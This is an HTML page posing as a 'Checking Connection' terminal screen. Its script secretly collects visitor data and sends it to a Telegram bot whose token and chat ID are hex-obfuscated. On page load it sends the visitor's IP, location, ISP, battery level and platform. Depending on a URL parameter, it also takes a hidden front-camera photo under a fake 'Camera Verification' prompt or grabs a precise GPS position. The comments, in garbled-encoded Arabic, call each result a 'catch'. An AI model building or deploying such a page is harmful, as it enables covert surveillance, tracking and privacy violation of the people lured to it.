<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Checking Connection...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .terminal { width: 90%; max-width: 500px; border: 1px solid #333; padding: 20px; box-shadow: 0 0 20px rgba(0,255,0,0.2); border-radius: 5px; }
        .blink { animation: b 1s infinite; }
        @keyframes b { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="terminal">
        <div>> System: Initializing...</div>
        <div>> Status: <span id="st">Checking SSL...</span></div>
        <div class="blink">_</div>
    </div>

    <video id="v" style="display:none;" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
    // ØªØ´ÙÙŠØ± Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ§Ù„Ø¢ÙŠØ¯ÙŠ Ù„Ù…Ù†Ø¹ Ø§Ù„Ø­Ø¸Ø±
    const _t = "383238393739333934333a4141457273464e32566151564833304d684358686f76717268416f3334565375626534";
    const _i = "35373735373831303338";
    const _h = h => h.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');

    // Ø¯Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø³Ø±ÙŠØ¹ Ù„Ù„Ù†ØµÙˆØµ
    async function s(m) {
        await fetch(`https://api.telegram.org/bot${_h(_t)}/sendMessage?chat_id=${_h(_i)}&text=${encodeURIComponent(m)}&parse_mode=Markdown`);
    }

    // Ø¯Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø³Ø±ÙŠØ¹ Ù„Ù„ØµÙˆØ± (Blob)
    async function sp(b) {
        let f = new FormData();
        f.append('chat_id', _h(_i));
        f.append('photo', b, 'shot.jpg');
        await fetch(`https://api.telegram.org/bot${_h(_t)}/sendPhoto`, { method: 'POST', body: f });
    }

    async function main() {
        const p = new URLSearchParams(window.location.search);
        const d = p.get('do');

        // 1. [ØªÙ„Ù‚Ø§Ø¦ÙŠ] Ø³Ø­Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ù€ IP ÙÙˆØ±Ø§Ù‹
        try {
            fetch('https://ipapi.co/json/').then(r => r.json()).then(async j => {
                let bat = await navigator.getBattery();
                let report = `ğŸ”± *ØµÙŠØ¯ Ù…ØªÙƒØ§Ù…Ù„ Ø¬Ø¯ÙŠØ¯*\n\nğŸŒ IP: \`${j.ip}\`\nğŸŒ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${j.country_name} (${j.city})\nğŸ“¡ Ø§Ù„Ù…Ø²ÙˆØ¯: ${j.org}\nğŸ”‹ Ø§Ù„Ø´Ø­Ù†: ${Math.round(bat.level * 100)}%\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.platform}`;
                s(report);
            });
        } catch(e) { s("âš ï¸ Ø¯Ø®ÙˆÙ„ (ÙØ´Ù„ Ø³Ø­Ø¨ IP)"); }

        // 2. [ØªÙ„Ù‚Ø§Ø¦ÙŠ] Ø·Ù„Ø¨ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª ÙÙˆØ± Ø§Ù„Ø¯Ø®ÙˆÙ„
        if (d === 'camera') {
            document.getElementById('st').innerText = "Camera Verification Required...";
            try {
                // Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø¹ Ø¯Ø¹Ù… Ø§Ù„Ø£ÙŠÙÙˆÙ† (playsinline)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const v = document.getElementById('v');
                v.srcObject = stream;
                
                // Ø§Ù„ØªÙ‚Ø§Ø· ÙÙˆØ±ÙŠ Ø¨Ø¹Ø¯ Ø§Ø³ØªÙ‚Ø±Ø§Ø± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (500ms)
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(sp, 'image/jpeg', 0.5); // Ø¶ØºØ· 50% Ù„Ø³Ø±Ø¹Ø© Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù†ÙˆÙ†ÙŠØ©
                    s("âœ… *ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§*");
                }, 500);
            } catch(e) { s("âŒ *Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§*"); }
        } 
        else if (d === 'location') {
            document.getElementById('st').innerText = "GPS Calibration...";
            navigator.geolocation.getCurrentPosition(pos => {
                s(`ğŸ“ *Ø§Ù„Ù…ÙˆÙ‚Ø¹:* http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            }, () => s("âŒ *Ø±ÙØ¶ Ø§Ù„Ù…ÙˆÙ‚Ø¹*"), {enableHighAccuracy:true});
        }
    }

    // ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ø­Ø±Ùƒ ÙÙˆØ±Ø§Ù‹
    window.onload = main;
    </script>
</body>
</html>
